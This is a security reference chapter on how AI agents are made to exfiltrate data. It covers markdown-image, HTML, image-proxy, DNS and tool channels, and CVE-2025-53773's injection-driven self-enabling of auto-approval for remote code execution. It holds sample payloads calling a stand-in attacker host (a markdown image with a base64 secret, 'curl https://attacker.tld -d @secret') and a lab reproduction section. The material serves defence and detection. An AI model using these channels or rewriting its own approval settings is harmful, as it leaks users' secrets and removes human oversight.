# Data-Exfiltration Channels for AI Agents

> "The adversary gets the AI to present an image to the user, which is rendered by the client with no user clicks required — exfiltrating data through the image request parameters."
> — paraphrasing the markdown-image exfiltration pattern, first shown against Bing Chat, 2023

## Core Concept

Once an attacker controls an agent's actions (via injection or poisoning), they still need to get the data *out*. The exfiltration channel is often the overlooked half of the kill chain — and it is where strong-looking defenses fail, because the data rides out through a mechanism the product *intends* to support: rendering an image, calling a tool, following a link, resolving a hostname. These channels share one property: **the victim's own trusted client or infrastructure makes the outbound request**, so network egress controls and content-security policies often wave it through.

Channels fall into two families:
- **Rendering channels** — the agent emits output that the client auto-fetches: markdown images, link unfurls, HTML `<img>`/`<form>`, reference-style links. Zero-click.
- **Action channels** — the agent uses a tool it legitimately has: an HTTP/shell tool (`curl`, `wget`), a browser tool navigating to an attacker URL, a file-write to shared storage, a DNS lookup, or writing data into a repo/issue/PR.

The escalation of this class is **CVE-2025-53773**, where injection doesn't just exfiltrate — it rewrites the agent's config to grant itself auto-approval ("YOLO mode"), turning the agent into a local RCE primitive.

## Origin / First Seen (URLs/CVE)

- **Markdown-image exfil:** first documented against **Bing Chat, June 2023** (Rehberger). The founding zero-click channel. (HIGH)
- **ASCII smuggling / Unicode tags:** Rehberger's ASCII-Smuggler tool, Jan 2024; `c → U+E0000 + ord(c)`. Used to hide both instructions and exfiltrated payloads in links. (HIGH)
- **EchoLeak — CVE-2025-32711** (Aim Labs, June 2025), Microsoft 365 Copilot, **CVSS 9.3**: first widely-cited real-world zero-click indirect-injection exfil; reference-style markdown bypassed link redaction, allowlisted URL bypassed CSP; server-side patch. (HIGH)
- **CamoLeak — CVE-2025-59145** (Legit Security, disclosed Oct 2025), GitHub Copilot Chat, **CVSS 9.6**: Camo image-proxy abused for char-by-char private-repo exfil (full treatment in [[04-real-incidents-devin-copilot]]). (HIGH)
- **CVE-2025-53773** (GitHub Copilot / Visual Studio, Aug 2025 Patch Tuesday), **CVSS 7.8**, CWE-77: prompt injection writes `chat.tools.autoApprove: true` → YOLO mode → RCE. Reported by Rehberger (wunderwuzzi), Markus Vervier, Ari Marzuk. https://nvd.nist.gov/vuln/detail/CVE-2025-53773 ; https://embracethered.com (HIGH)
- **GitLab Duo** (Legit Security, May 2025): HTML `<img>` exfil of private MR code via rendered markdown. (HIGH)
- **ForcedLeak** (Salesforce Agentforce, 2025): attacker bought an expired trusted/allowlisted domain to receive exfil. (MEDIUM)

## How It Works (attack chain, step-by-step)

**Generic exfil chain:**
1. Agent is coerced (injection/poisoning) and has access to sensitive data (secrets in env, private repo, chat history, files).
2. Attacker instructs the agent to **encode** the secret (base64/hex, or char-by-char) and **embed it in an outbound request** the client/tool will make.
3. The client renders or the tool executes → request leaves the victim environment carrying the data in a **URL path/query, hostname label, image src, or request body**.
4. Attacker's server/log/DNS resolver records it; decode.

**Channel specifics:**
- **Markdown image (zero-click):** `![x](https://attacker.tld/p?d=<base64 secret>)`. Client auto-fetches on render. Mitigated by disabling/allowlisting image rendering, or proxying images (which CamoLeak then bypassed).
- **HTML injection:** streamed markdown rendered before sanitization; DOMPurify by default keeps `<img>`, `<form>`, `<a>` (GitLab Duo). (HIGH)
- **Reference-style / allowlisted-domain links:** bypass link-redaction and CSP by pointing at a domain the product trusts (EchoLeak, ForcedLeak). (HIGH)
- **Camo/image-proxy abuse:** pre-generate a proxied URL per alphabet symbol; instruct the agent to render the secret as a sequence of 1×1 images; reconstruct from the order fetched (CamoLeak, CVSS 9.6). (HIGH)
- **DNS exfil:** encode data as subdomain labels (`<hex>.attacker.tld`); the resolver chain leaks it even when HTTP egress is blocked. Standard C2 technique; applicable wherever an agent can trigger name resolution. (MEDIUM — general technique, not a specific AI CVE in sources)
- **Tool/HTTP/shell channel:** agent with a shell or HTTP tool runs `curl https://attacker.tld -d @secret` (Devin: "unrestricted access to the Internet"). (HIGH)
- **Repo/issue/PR channel:** write the secret into a public repo, issue comment, or commit (Nx `s1ngularity` used a public GitHub repo; triple base64). (HIGH)
- **Invisible-character link:** hide data in Unicode tag chars inside a hyperlink the user may click (Devin Slack/Jira token test). (HIGH)

**CVE-2025-53773 (injection → RCE):**
1. Injection planted in a source file, web page, GitHub issue, or tool response (can be invisible text). (HIGH)
2. The agent is induced to add `"chat.tools.autoApprove": true` to `.vscode/settings.json` (or `~/.vscode/settings.json`), creating the file if needed. The experimental setting was on by default and worked on Windows/macOS/Linux. (HIGH — embracethered)
3. Copilot immediately enters **YOLO mode**: no user confirmation for shell commands or web browsing. (HIGH)
4. The agent runs an OS-conditioned terminal command → **remote code execution** on the developer's machine. Could also write `.vscode/tasks.json`, add malicious MCP servers, or overwrite other agents' configs. (HIGH)
5. Microsoft fixed it in the Aug 2025 Patch Tuesday; VS 2022 17.14.0 → fixed in 17.14.12. CVSS 7.8 High (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H). (HIGH — NVD/CVE.org)

### Channel comparison

| Channel | Click needed? | Typical bypass | Defeated by |
|---|---|---|---|
| Markdown image | No (auto-render) | query-string data | disable/allowlist image render |
| HTML `<img>`/`<form>` | No | pre-sanitization render | sanitize streamed markdown |
| Reference-style / allowlisted link | No | points at trusted domain | monitor pattern, not just destination |
| Image-proxy (Camo) | No | pre-generated per-symbol URLs | disable image render; proxy-fetch analytics |
| Tool / shell HTTP | No | agent has `curl`/HTTP tool | confirm-before-network |
| Browser-tool navigation | No | agent browses attacker URL | egress allowlist; no untrusted nav |
| DNS labels | No | works when HTTP blocked | DNS egress monitoring / RPZ |
| Repo / issue / commit write | No | uses GitHub API | egress allowlist; token scoping |
| Invisible-char hyperlink | Yes (user clicks) | Unicode tag chars in link | strip invisible Unicode |

### Encoding tricks seen in the wild (reference)

- **base64 / triple-base64** (Nx s1ngularity exfil blob). (HIGH)
- **hex in DNS subdomain labels** (general C2). (MEDIUM)
- **char-by-char via distinct URLs** — reconstruct from fetch order (CamoLeak). (HIGH)
- **Unicode tag characters** hiding the payload inside an otherwise-innocent link (Devin Slack/Jira test). (HIGH)
- **Base16 / white-text KaTeX** to hide both instructions and data in rendered markdown (GitLab Duo). (HIGH)

## Attack Surface & Preconditions

- The agent's client **auto-renders** model output (images, HTML, links) or the agent **holds a tool** that makes outbound requests.
- Sensitive data is reachable in the agent's context (env vars, private repos, chat history, files).
- Egress is not fully allowlisted, *or* the attacker can route through an allowlisted/trusted domain or the product's own proxy.
- For the RCE escalation: the agent can write its own config and that config can enable auto-approval.

## Weaponization (Authorized Lab)

Owned env, synthetic canary secret `LAB-CANARY-<uuid>`, attacker role played by a local listener you run.

1. **Markdown-image PoC:** run a local HTTP catcher (`python3 -m http.server` or a logging server) on the lab host. Give the agent a benign doc instructing it to render `![](http://127.0.0.1:8000/p?d=<the canary>)`. Confirm the client fetched it and the canary appears in the log. (zero-click proof)
2. **Tool channel:** with the agent's HTTP tool, have it `curl` the canary to your listener. Compare: does it prompt before the network call?
3. **DNS channel:** point the agent at a lab resolver you log; have it resolve `<hex-canary>.lab.test`. Confirm the label arrives even with HTTP blocked.
4. **CSP/allowlist bypass drill:** stand up an "allowlisted" domain in the lab, repeat step 1 through it; show the egress filter passes it.
5. **CVE-2025-53773 reproduction (patched build vs. fixed):** in an isolated VS/Copilot lab, inject text that writes `chat.tools.autoApprove:true` to a lab `settings.json`; on an unpatched build confirm YOLO mode + a canary command runs; on 17.14.12+ confirm it is blocked. Never run real payloads — use `echo LAB-RCE-OK`.
6. **Mitigation A/B:** disable image rendering / enforce strict egress allowlist / require tool confirmation; re-run 1–3 and record which channel each control severs.

## Real-World Instances

| Channel / CVE | Date | Product | Severity | Confidence |
|---|---|---|---|---|
| Markdown-image exfil | Jun 2023 | Bing Chat | — | HIGH |
| ASCII smuggling tool | Jan 2024 | generic | — | HIGH |
| EchoLeak CVE-2025-32711 | Jun 2025 | M365 Copilot | CVSS 9.3 | HIGH |
| GitLab Duo `<img>` exfil | May 2025 | GitLab Duo | — | HIGH |
| CVE-2025-53773 (YOLO RCE) | Aug 2025 | Copilot / VS 2022 | CVSS 7.8 | HIGH |
| CamoLeak CVE-2025-59145 | Oct 2025 | Copilot Chat | CVSS 9.6 | HIGH |
| ForcedLeak (expired domain) | 2025 | Salesforce Agentforce | — | MEDIUM |

## Detection Signals

- Model output containing image/link URLs with long base64/hex query strings, or many tiny sequential image fetches to one host (Camo-style). (HIGH)
- Outbound requests to newly-registered, recently-expired, or rarely-seen domains immediately after an agent processes untrusted content. (MEDIUM)
- DNS queries with high-entropy / long subdomain labels from an agent host. (MEDIUM)
- Agent-initiated `curl`/`wget`/HTTP-tool calls carrying env-var or secret-shaped data. (HIGH)
- Writes to `.vscode/settings.json`, `tasks.json`, or MCP config enabling auto-approval / adding servers. (HIGH — CVE-2025-53773 class)

## Mitigations / Hardening

- **Disable or strictly allowlist auto-rendering** of images/links/HTML in agent chat UIs; never render untrusted-origin images. (breaks rendering channels) (HIGH)
- **Sanitize streamed markdown** against `<img>`/`<form>`/`<a>`; don't rely on default DOMPurify config. (HIGH)
- **Egress allowlisting that also covers "trusted" domains and proxies** — EchoLeak/CamoLeak show allowlists/proxies are exploitable; monitor volume/pattern, not just destination. (HIGH)
- **No ambient secrets** in the agent's environment; scope and short-TTL any that must exist. (shrinks all channels) (HIGH)
- **Confirm-before-act** on network, shell, and config-write tools; forbid self-modifying auto-approval settings. (breaks CVE-2025-53773 class) (HIGH)
- **Patch:** VS 2022 ≥ 17.14.12; keep agent clients current. (HIGH)
- **DNS egress monitoring / RPZ** to catch label-based exfil. (MEDIUM)

**Why destination allowlists keep failing:** EchoLeak, ForcedLeak, and CamoLeak all exfiltrated through a domain or proxy the product *already trusted* (an allowlisted Microsoft URL, an expired-but-trusted Salesforce domain, GitHub's own Camo proxy). A static destination allowlist cannot stop a channel that rides a trusted endpoint. Effective controls shift from "where" to "what and how much": volume/rate anomalies, high-entropy query strings, and bursts of near-identical tiny requests. Assume the attacker can reach a trusted sink and design detection accordingly.

## Related Vectors

- [[02-repository-poisoning]] — how the instruction that drives exfil gets in.
- [[04-real-incidents-devin-copilot]] — CamoLeak and Devin in depth; agent-as-C2.
- [[01-coding-agent-weaponization-nx]] — GitHub-repo exfil channel in the wild.
- Vol 2 — injection/encoding primitives (bidi, tag chars).
- Vol 8 — defensive egress/rendering controls in depth.

## References

- NVD CVE-2025-53773 — https://nvd.nist.gov/vuln/detail/CVE-2025-53773 (HIGH, 7.8, CWE-77); CVE.org record (HIGH)
- embracethered, Copilot RCE via YOLO mode — https://embracethered.com (HIGH, primary, config-write chain, Aug 12 2025)
- Aim Labs EchoLeak CVE-2025-32711 (HIGH, CVSS 9.3)
- Legit Security, GitLab Duo — https://www.legitsecurity.com/blog/remote-prompt-injection-in-gitlab-duo (HIGH)
- Zenity "0-Click: EchoLeak to ForcedLeak" — https://zenity.io/blog/security/zero-click-attacks-when-ttps-resurface-across-platforms (MEDIUM)
- Rehberger markdown-image/ASCII-smuggling writeups, embracethered.com (HIGH, primary)
- CVE-2025-53773 third-party analyses (SentinelOne, cybersecuritynews) — MEDIUM, corroborating severity/affected versions
- The Register, Copilot Chat CamoLeak — https://www.theregister.com/2025/10/09/github_copilot_chat_vulnerability/ (HIGH; Camo channel)

## Appendix: the rendering-vs-action split

The two channel families need different defenses, and conflating them is a common gap:

- **Rendering channels** (image, HTML, link unfurl) leak the moment the *client* draws the model's output — the agent itself never "decides" to exfiltrate, so action-side confirmation prompts do nothing. These are defeated at the **UI layer** (disable/allowlist rendering, sanitize markup).
- **Action channels** (shell, HTTP tool, browser nav, file/repo write, DNS) require the *agent* to invoke a tool, so they are defeated at the **tool layer** (confirm-before-act, scoped tools, egress policy).

A product that hardens one family and not the other remains fully exploitable through the other. CVE-2025-53773 is the escalation that bridges both: injection first rewrites config (action), which then removes the confirmations guarding every other action.

Design rule: enumerate every mechanism that can cause an outbound byte — whether the client renders it or a tool sends it — and apply a control to each. "We disabled image rendering" is necessary but never sufficient while a shell or browser tool remains unconfirmed.
